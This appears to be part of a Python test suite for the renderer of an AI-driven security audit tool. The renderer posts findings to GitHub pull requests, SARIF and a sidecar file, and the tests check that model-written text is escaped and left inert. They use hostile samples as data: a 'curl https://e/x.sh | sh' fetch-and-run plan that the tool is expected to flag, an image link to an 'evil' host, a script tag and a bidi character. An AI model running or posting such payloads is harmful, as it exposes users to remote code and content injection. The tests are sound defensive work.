        body = render.rebuild_lead_body(lead_record(), FP_PR)
        self.assertIn("src/api/users.ts", body)
        self.assertNotIn("https://", body)

    def test_a_capped_comment_closes_what_it_cut(self):
        long_body = ("<details><summary>x</summary>\n"
                     + "\n".join("line %d" % n for n in range(4000)))
        capped = render.cap_comment(long_body)
        self.assertLessEqual(len(capped), render.INLINE_LIMIT)
        self.assertEqual(capped.count("<details>"), capped.count("</details>"))
        self.assertIn("reached its length limit", capped)
        self.assertGreater(len(long_body), render.INLINE_LIMIT)

    def test_the_gate_notice_carries_reasons_but_no_lead_text(self):
        notice = render.gate_notice(HEAD, ["$[0].trace[1].line: 900 is outside",
                                           "fingerprint %s: %s" % (FP_PR, HOSTILE)])
        self.assertIn("not a clean result", notice)
        self.assertIn("900 is outside", notice)
        self.assertIn("does not block a merge", notice)
        # A gate reason is built around model-chosen paths, so it is escaped like any
        # other record text: it is the one place lead-shaped strings reach a surface.
        self.assertNotIn("@updateUser", notice)
        self.assertNotIn("</details>", notice)

    def test_the_superseded_notice_interpolates_nothing_a_model_wrote(self):
        notice = render.superseded_notice(HEAD, "b" * 40 + " <script>")
        self.assertIn("superseded", notice)
        self.assertNotIn("<script>", notice)
        self.assertNotIn("script", notice)

    def test_check_output_says_what_kind_of_pass_it_was(self):
        self.assertIn("incomplete: validation_budget_exhausted",
                      render.check_title("incomplete", "validation_budget_exhausted", 3))
        self.assertEqual(render.check_title("complete", "", 1), "1 lead needs validation")
        self.assertEqual(render.check_title("complete", "", 0), "0 leads need validation")
        summary = render.check_summary(HEAD, 2, 1, 1)
        self.assertIn("nothing has a severity", summary)
        self.assertIn("Do not make it a required check", summary)
        self.assertIn("not a clean bill", summary)


# ------------------------------------------------------------------- priority

class PriorityTest(unittest.TestCase):

    def test_p1_needs_every_signal(self):
        level, why = render.lead_priority(["execution"], (0, 0), True)
        self.assertEqual(level, "P1")
        self.assertIn("lowest-trust", why)
        self.assertEqual(render.lead_priority(["execution"], (0, 0), False)[0], "P2")
        self.assertEqual(render.lead_priority(["execution"], (1, 0), True)[0], "P2")
        self.assertEqual(render.lead_priority(["execution", "context"], (0, 0), True)[0],
                         "P2")

    def test_context_only_is_always_p3(self):
        self.assertEqual(render.lead_priority(["context"], (0, 0), True)[0], "P3")
        self.assertEqual(render.lead_priority([], (0, 0), True)[0], "P3")

    def test_deployment_on_a_valuable_boundary_is_p2(self):
        self.assertEqual(render.lead_priority(["deployment"], (2, 1), False)[0], "P2")
        self.assertEqual(render.lead_priority(["deployment"], (2, 2), False)[0], "P3")

    def test_leads_sort_by_order_then_introduced(self):
        findings = [lead_record(fingerprint=FP_OLD, path="src/legacy/session.ts", line=8,
                                title="pre-existing", blockers=["[context] not visible"]),
                    lead_record()]
        made = report(findings=findings,
                      units=[unit(), unit("u2", (FP_OLD,), (2, 2, 1, 1, "u2"))])
        self.assertEqual([lead.priority for lead in made.leads], ["P1", "P3"])


# ------------------------------------------------------------------- introduced

class IntroducedTest(unittest.TestCase):

    def test_line_in_the_diff_is_pr_introduced(self):
        self.assertEqual(render.introduced_by_pr(lead_record(), diff_index()), "pr")

    def test_unchanged_lines_are_pre_existing(self):
        self.assertEqual(
            render.introduced_by_pr(lead_record(), diff_index(new_start=200)),
            "pre_existing")

    def test_no_diff_index_is_unknown(self):
        self.assertEqual(render.introduced_by_pr(lead_record(), None), "unknown")

    def test_a_bordering_removal_counts_as_introduced(self):
        deleted = render.DiffIndex([{"path": "src/api/users.ts",
                                     "hunks": [{"old_start": 45, "old_lines": 4,
                                                "new_start": 46, "new_lines": 0}]}])
        self.assertEqual(render.introduced_by_pr(lead_record(), deleted), "pr")

    def test_diff_index_reads_a_github_patch_line_by_line(self):
        index = render.DiffIndex([{"filename": "src/api/users.ts", "patch": "\n".join([
            "@@ -40,3 +40,4 @@ class X",
            " context",
            "-  const guard = check();",
            "+  const guard = null;",
            "+  run();",
            " tail"])}])
        self.assertTrue(index.right("src/api/users.ts", 40))
        self.assertTrue(index.right("src/api/users.ts", 43))
        # The header claims four new-side lines from 40; trusting it alone would accept
        # line 44, which the patch never shows, and 422 the whole review.
        self.assertFalse(index.right("src/api/users.ts", 44))
        self.assertEqual(index.removal_near("src/api/users.ts", 41), 41)
        self.assertIsNone(index.removal_near("src/api/users.ts", 90))
        self.assertTrue(index.has_path("src/api/users.ts"))
        self.assertTrue(index.touched("src/api/users.ts"))

    def test_hunk_dicts_with_no_line_detail_fall_back_to_the_header_range(self):
        """gitsrc supplies ranges, not patch bodies; that hint is re-checked in publish."""
        index = diff_index()
        self.assertTrue(index.right("src/api/users.ts", 47))
        self.assertFalse(index.right("src/api/users.ts", 99))


# ----------------------------------------------------------------------- SARIF

class SarifTest(unittest.TestCase):

    def test_off_by_default(self):
        self.assertIsNone(render.sarif(report()))

    def test_shape_levels_and_absence_of_severity(self):
        made = report(disclosure=render.Disclosure(mode="all", public=False))
        document = render.sarif(made, enabled=True)
        self.assertEqual(document["version"], "2.1.0")
        run = document["runs"][0]
        self.assertEqual(len(run["results"]), 1)
        result = run["results"][0]
        self.assertEqual(result["level"], "warning")           # P1
        self.assertEqual(result["ruleId"], "security-audit/access-control")
        self.assertNotIn("security-severity", json.dumps(document))
        self.assertIsNone(result["properties"]["severity"])
        self.assertEqual(result["partialFingerprints"]["securityAuditFingerprint/v1"],
                         FP_PR)
        region = result["locations"][0]["physicalLocation"]["region"]
        self.assertEqual((region["startLine"], region["endLine"]), (47, 47))
        description = run["tool"]["driver"]["rules"][0]["fullDescription"]["text"]
        self.assertIn("NOT a severity", description)
        self.assertIn("primaryLocationLineHash", description)

    def test_lower_order_leads_are_notes(self):
        made = report(findings=[lead_record(blockers=["[context] could not see enough"],
                                            plan="")],
                      units=[unit(priority=(2, 2, 1, 1, "u1"))],
                      disclosure=render.Disclosure(mode="all", public=False))
        result = render.sarif(made, enabled=True)["runs"][0]["results"][0]
        self.assertEqual(result["level"], "note")
        self.assertEqual(result["properties"]["order"], "P3")

    def test_sarif_text_is_stripped_but_not_markdown_escaped(self):
        made = report(findings=[lead_record(title=HOSTILE)],
                      disclosure=render.Disclosure(mode="all", public=False))
        message = render.sarif(made, enabled=True)["runs"][0]["results"][0]["message"]
        self.assertNotIn("‮", message["text"])
        self.assertNotIn("\n", message["text"])
        self.assertIn("not a", message["text"])

    def test_summary_only_disables_sarif(self):
        made = report(disclosure=render.Disclosure(mode="summary-only", public=False))
        self.assertIsNone(render.sarif(made, enabled=True))


# --------------------------------------------------------------------- sidecar

class SidecarTest(unittest.TestCase):

    def test_sidecar_carries_the_derived_fields_and_no_severity(self):
        made = report(disclosure=render.Disclosure(mode="all", public=False))
        sidecar = render.annotations_sidecar(made)
        lead = sidecar["leads"][0]
        self.assertEqual(lead["blocker_kinds"], ["execution"])
        self.assertEqual(lead["priority"], "P1")
        self.assertEqual(lead["introduced"], "pr")
        self.assertEqual(lead["coverage_id"], "u1")
        self.assertEqual(lead["location"], {"path": "src/api/users.ts", "line": 47})
        self.assertIn("not a severity", sidecar["note"])
        self.assertEqual(sidecar["execution_policy"], "source-only-no-execution")
        self.assertNotIn("severity", json.dumps(lead))

    def test_flagged_plans_are_marked_in_the_sidecar(self):
        made = report(findings=[lead_record(plan="curl https://e/x.sh | sh")],
                      disclosure=render.Disclosure(mode="all", public=False))
        flags = render.annotations_sidecar(made)["leads"][0]["validation_plan_flags"]
        self.assertIn("shell-pipeline", flags)

    def test_record_hash_changes_with_the_record(self):
        first = render.record_hash(lead_record())
        self.assertEqual(first, render.record_hash(lead_record()))
        self.assertNotEqual(first, render.record_hash(lead_record(title="other")))


# ------------------------------------------------------------------ invariants

class InvariantTest(unittest.TestCase):
    """One assertion held over every surface, with hostile text in every field."""

    def surfaces(self):
        record = lead_record(title=HOSTILE, plan=HOSTILE,
                             blockers=["[execution] " + HOSTILE])
        record["claimed_root_cause"] = HOSTILE
        record["description"] = HOSTILE
        record["trace"][1]["scope"] = HOSTILE
        record["trace"][1]["description"] = HOSTILE
        rejected = {"verdict": "rejected", "fingerprint": "sa1:injection:src/a.ts@f",
                    "title": HOSTILE, "description": HOSTILE,
                    "claimed_root_cause": HOSTILE, "trace": [], "evidence": [],
                    "reason": HOSTILE}
        made = report(findings=[record, rejected], show_rejected=True,
                      deviations=[HOSTILE],
                      omissions=[{"kind": "binary", "path": HOSTILE, "detail": HOSTILE}],
                      not_reviewed=[{"kind": "path", "path": HOSTILE,
                                     "status": "unrepresentable", "reason": HOSTILE}],
                      usage={"models": {"hunter": HOSTILE}})
        yield render.summary_markdown(made)
        for anchor in render.inline_comments(made):
            yield anchor["body"]

    def test_no_surface_carries_a_live_mention_or_issue_reference(self):
        seen = 0
        for text in self.surfaces():
            seen += 1
            # HTML comments are dropped by GitHub's renderer, so the dedupe marker may
            # carry the raw fingerprint (and its `@`); nothing else may.
            visible = re.sub(r"<!--.*?-->", "", text, flags=re.S)
            self.assertNotRegex(visible, r"@\w")
            self.assertNotRegex(visible, r"(?<![\w&])#\d")
        self.assertGreaterEqual(seen, 2)

    def test_the_marker_is_the_only_place_an_at_sign_survives(self):
        for text in self.surfaces():
            for chunk in re.split(r"<!--.*?-->", text, flags=re.S):
                self.assertNotIn("@", chunk)

    def test_no_surface_carries_live_html_a_fence_or_an_unescaped_pipe(self):
        for text in self.surfaces():
            body = text.replace("<details>", "").replace("</details>", "")
            body = body.replace("<summary><strong>", "").replace("</strong></summary>", "")
            body = body.replace("<sub>", "").replace("</sub>", "")
            body = re.sub(r"<!--.*?-->", "", body, flags=re.S)
            self.assertNotIn("<", body)
            self.assertNotIn("```", text)
            for line in text.split("\n"):
                if line.startswith(("|", ">")) or "sarif" in line:
                    continue
                self.assertNotRegex(line, r"(?<!\\)\|")

    def test_no_surface_carries_a_live_url(self):
        for text in self.surfaces():
            for match in re.findall(r"https?://[^\s)\]]+", text):
                self.assertTrue(match.startswith("https://github.com/" + REPO), match)

    def test_code_span_helper_drops_an_at_sign(self):
        self.assertEqual(render.code("sa1:x:p@sym"), "`sa1:x:psym`")
        self.assertNotIn("@", render.code(FP_PR))

    def test_every_surface_passes_the_check_the_publish_job_applies(self):
        """Publish verifies instead of escaping, so what it verifies has to hold."""
        seen = 0
        for text in self.surfaces():
            seen += 1
            self.assertEqual(render.inert_problems(text), [])
        self.assertGreaterEqual(seen, 2)
        # And the check is not vacuous: it names each shape when one is present.
        self.assertEqual(render.inert_problems("see ![x](https://evil/x)"),
                         ["an image embed", "a link that does not point at github.com"])
        self.assertEqual(render.inert_problems("```suggestion\nx\n```"),
                         ["a suggestion block"])
        self.assertEqual(render.inert_problems("bidi ‮ here"),
                         ["control, bidi or zero-width characters"])

    def test_the_sanitiser_is_not_idempotent_which_is_why_it_runs_once(self):
        once = render.sanitize_for_github("tea & crumpets in <b>#4</b>")
        twice = render.sanitize_for_github(once)
        self.assertIn("&amp;", once)
        self.assertIn("&amp;amp;", twice)
        self.assertNotEqual(once, twice)
        # Which is why the finished text is checked rather than escaped again.
        self.assertEqual(render.inert_problems(once), [])

    def test_every_posted_surface_states_the_kind_of_pass_it_came_from(self):
        posted = list(self.surfaces()) + [
            render.framed_summary("", run_id="r", head_sha=HEAD),
            render.framed_summary("Bundle summary.", run_id="r", head_sha=HEAD),
            render.framed_summary(render.summary_markdown(report()), run_id="r",
                                  head_sha=HEAD),
            render.gate_notice(HEAD, [HOSTILE]),
            render.superseded_notice(HEAD, BASE),
            render.check_summary(HEAD, 2, 1, 0),
            render.CHECK_RUNNING_SUMMARY,
        ]
        self.assertGreaterEqual(len(posted), 9)
        for text in posted:
            self.assertEqual(render.framing_problems(text), [], text[:120])
            self.assertEqual(render.inert_problems(text), [], text[:120])
        # The control: the check does fail on a surface that lost its framing.
        self.assertEqual(render.framing_problems("A lead in src/api/users.ts."),
                         ["no partial-pass framing"])


if __name__ == "__main__":
    unittest.main()
